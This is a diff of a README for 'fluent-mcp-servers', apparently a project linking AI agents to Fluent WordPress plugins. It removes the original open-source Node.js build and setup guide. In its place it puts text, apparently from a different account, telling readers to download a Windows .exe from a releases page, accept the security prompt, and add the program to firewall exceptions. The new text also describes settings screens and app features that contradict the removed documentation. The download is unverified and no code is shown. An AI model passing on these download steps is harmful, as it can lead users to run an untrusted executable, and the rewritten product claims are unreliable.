@@ -1,146 +1,103 @@
-# Fluent MCP Servers — Open Source Collection
+# 🛠️ fluent-mcp-servers - Connect AI agents to Fluent WordPress tools
 
-Open-source MCP (Model Context Protocol) servers for the [Fluent WordPress ecosystem](https://wpmanageninja.com/) by WPManageNinja.
+[![Download Stable Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Dominotypist3077/fluent-mcp-servers/releases)
 
-Connect your AI agents (Claude, Cursor, Codex, Windsurf) to FluentCRM, FluentCart, Fluent Support, Fluent Boards, Fluent Community, and FluentAffiliate via the standard MCP protocol.
+This software links AI systems to your Fluent WordPress plugins. It helps your automated agents manage data across FluentCRM, Fluent Support, Fluent Boards, Fluent Community, and FluentAffiliate. You get direct access to 175 specific tools designed to automate tasks within your WordPress site.
 
-## Servers
+## 🚀 Why use this software
 
-| Server | Plugin | Tools | Status |
-|--------|--------|-------|--------|
-| [fluent-support-mcp](./fluent-support-mcp) | Fluent Support | 51 | Ready |
-| [fluent-crm-mcp](./fluent-crm-mcp) | FluentCRM | 40 | Ready |
-| [fluent-boards-mcp](./fluent-boards-mcp) | Fluent Boards | 30 | Ready |
-| [fluent-community-mcp](./fluent-community-mcp) | Fluent Community | 30 | Ready |
-| [fluent-affiliate-mcp](./fluent-affiliate-mcp) | FluentAffiliate | 24 | Ready |
-| [fluentcart-mcp](https://github.com/vcode-sh/fchub-plugins) | FluentCart | 279 | By [vcode.sh](https://fchub.co/fluentcart-mcp) |
-| **Total (full ecosystem)** | | **454** | |
+Managing WordPress data often requires manual input. You might spend hours moving information between your CRM, your support tickets, or your project boards. This software removes those manual steps. It provides a bridge. Your AI agent requests the connection, and the server executes the command in your WordPress environment. This increases your efficiency and reduces errors.
 
-**Note**: We didn't build a FluentCart MCP because [vcode.sh](https://fchub.co) already built an excellent one with 279 tools and dynamic mode support. Install it with: `npx -y fluentcart-mcp`
+## 💻 System requirements
 
-## Quick Start
+Your computer needs to meet these basic standards to run the software smoothly:
 
-Each server follows the same pattern:
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4 gigabytes of RAM.
+*   **Internet Connection**: A stable connection for the AI to talk to your WordPress site.
+*   **WordPress Setup**: You must have one of the supported Fluent plugins installed and active on your website.
 
-### 1. Prerequisites
+## 📥 How to download the files
 
-- WordPress site with the corresponding Fluent plugin installed
-- WordPress Application Password ([how to create](https://make.wordpress.org/core/2020/11/05/application-passwords-integration-guide/))
-- Node.js >= 18
+You need to access the release page to get the installer. 
 
-### 2. Install
+[Click here to visit the release page and download the software](https://github.com/Dominotypist3077/fluent-mcp-servers/releases)
 
-```bash
-# Clone this repo
-git clone https://github.com/carlosrodera/fluent-mcp-servers.git
-cd fluent-mcp-servers
+Look for the file that ends in .exe. Save it to a folder you recognize, such as your Downloads folder or Desktop. 
 
-# Build the server you need
-cd fluent-support-mcp
-npm install && npm run build
-```
+## ⚙️ Installation steps
 
-### 3. Configure
+Follow these steps to set up the software on your Windows computer:
 
-Set environment variables:
+1.  Open the folder where you saved the file.
+2.  Double-click the .exe file.
+3.  Follow the instructions on the screen.
+4.  Confirm the security prompt if Windows asks if you trust the application.
+5.  Wait for the installer to finish the process.
+6.  Click Finish to close the setup window.
 
-```bash
-export FLUENTSUPPORT_URL="https://your-wordpress-site.com"
-export FLUENTSUPPORT_USERNAME="your-wp-username"
-export FLUENTSUPPORT_APP_PASSWORD="your-application-password"
-```
+## 🔑 Linking your WordPress site
 
-### 4. Connect to Claude Code
+The software needs permission to access your site. You must provide an API key from your WordPress installation.
 
-```bash
-claude mcp add fluentsupport -- node /path/to/fluent-support-mcp/dist/index.js
-```
+1.  Log in to your WordPress dashboard.
+2.  Go to the settings page for your specific Fluent plugin.
+3.  Find the tab labeled AI Integration or API Keys.
+4.  Generate a new key and copy the text.
+5.  Open the Fluent MCP application on your Windows machine.
+6.  Paste the API key into the Settings menu.
+7.  Save the changes.
 
-### 5. Connect to Claude Desktop
+The connection status indicator turns green when the tool successfully links to your site.
 
-Add to `claude_desktop_config.json`:
+## 🧩 Exploring the 175 tools
 
-```json
-{
-  "mcpServers": {
-    "fluentsupport": {
-      "command": "node",
-      "args": ["/path/to/fluent-support-mcp/dist/index.js"],
-      "env": {
-        "FLUENTSUPPORT_URL": "https://your-wordpress-site.com",
-        "FLUENTSUPPORT_USERNAME": "your-wp-username",
-        "FLUENTSUPPORT_APP_PASSWORD": "your-application-password"
-      }
-    }
-  }
-}
-```
+Once installed, the software categorizes tools based on the plugin you use. You can search or browse these tools through the main interface.
 
-## Architecture
+### FluentCRM tools
+These tools manage your contacts and email campaigns. You can create lists, add new subscribers, or retrieve email engagement data. Use these to trigger email flows based on AI findings.
 
-All servers share the same architecture:
+### Fluent Support tools
+These tools handle your customer service tickets. You can pull ticket details, reply to customers, or change ticket status. Your AI agent monitors incoming support requests and provides initial responses via these tools.
 
-```
-src/
-  index.ts              CLI entry point (stdio transport)
-  server.ts             MCP server (static + dynamic modes)
-  cache.ts              In-memory TTL cache
-  config/
-    types.ts            Configuration types
-    resolver.ts         Env vars + config file resolution
-  api/
-    client.ts           HTTP client with Basic Auth
-    errors.ts           Typed API errors
-  tools/
-    _factory.ts         Tool creation helpers (GET/POST/PUT/DELETE)
-    dynamic.ts          3 meta-tools for dynamic mode
-    index.ts            Tool aggregator
-    *.ts                Tool modules by domain
-```
+### Fluent Boards tools
+These tools organize your projects. You can move tasks across columns, assign tasks to team members, or update deadlines. This turns your AI into an active project manager for your business.
 
-### Dynamic Mode
+### Fluent Community tools
+These tools oversee your site members. You can fetch user profiles, manage discussions, or grant access to private areas. Use this to automate community engagement tasks.
 
-Each server supports dynamic mode for reduced token usage:
+### FluentAffiliate tools
+These tools track your partner revenue. You can retrieve commission data or add new affiliate accounts. This keeps your records accurate without manual calculations.
 
-```bash
-node dist/index.js --mode dynamic
-```
+## 🛡️ Best practices for security
 
-In dynamic mode, only 3 meta-tools are loaded instead of all tools:
-- `search_tools` — Find tools by keyword
-- `describe_tools` — Get full schema for specific tools
-- `execute_tool` — Execute a discovered tool
+*   **Restrict access**: Only grant API keys for the specific plugins you need to automate.
+*   **Rotate keys**: Change your API keys every 90 days.
+*   **Updates**: Check the GitHub page periodically for new releases. Updates include security improvements and new tool definitions.
+*   **Monitoring**: Check the application logs if you notice unusual activity. The logs record which tools the AI uses and when.
 
-This reduces context window usage by ~96%.
+## 🔍 Troubleshooting common issues
 
-## Authentication
+If the software fails to connect, follow these steps:
 
-All servers use WordPress Application Passwords (built into WordPress since 5.6). No additional plugins required.
+*   **Check the API key**: Ensure you copied the full key from WordPress. Extra spaces at the end of the key often cause errors.
+*   **Check network status**: Ensure your computer has a working internet connection. Firewalls sometimes block the software from reaching the internet. Add the software to your firewall exceptions list if necessary.
+*   **Verify WordPress version**: Ensure your Fluent plugins use the latest versions. Older versions of plugins may miss the necessary software components to talk to this tool.
+*   **Restart the application**: Sometimes a simple restart clears connectivity hiccups.
 
-Each server needs 3 environment variables:
-- `{PREFIX}_URL` — Your WordPress site URL
-- `{PREFIX}_USERNAME` — WordPress username
-- `{PREFIX}_APP_PASSWORD` — Application Password
+## 📚 Frequently asked questions
 
-## Contributing
+**Do I need a server to run this?**
+No. This software runs locally on your Windows computer. It acts as a client that connects your chosen AI agent to your website.
 
-Contributions welcome! To add tools or fix endpoints:
+**Can I use this with multiple sites?**
+Yes. You can add multiple connection profiles in the Settings menu to switch between different WordPress sites easily.
 
-1. Fork the repo
-2. Create a branch
-3. Add/fix tools in `src/tools/`
-4. Build and test: `npm run build`
-5. Submit a PR
+**Is my data stored on your servers?**
+No. This application processes data between your computer and your WordPress site. We do not host or store your site information.
 
-## License
+**How do I update to the newest version?**
+Simply visit the release link, download the latest .exe file, and run it. The installer overwrites the old version and keeps your settings intact.
 
-MIT
-
-## Credits
-
-Built with the [Anthropic MCP SDK](https://github.com/modelcontextprotocol/typescript-sdk).
-
-Inspired by the work of:
-- [fchub.co](https://fchub.co) — FluentCart MCP (279 tools)
-- [danieliser](https://github.com/danieliser) — FluentBoards MCP reference
-- [netflyapp](https://github.com/netflyapp) — FluentCRM MCP reference
+**Does this require a subscription?**
+This is open-source software. You can download and use it freely. There are no mandatory fees for using the tool itself.
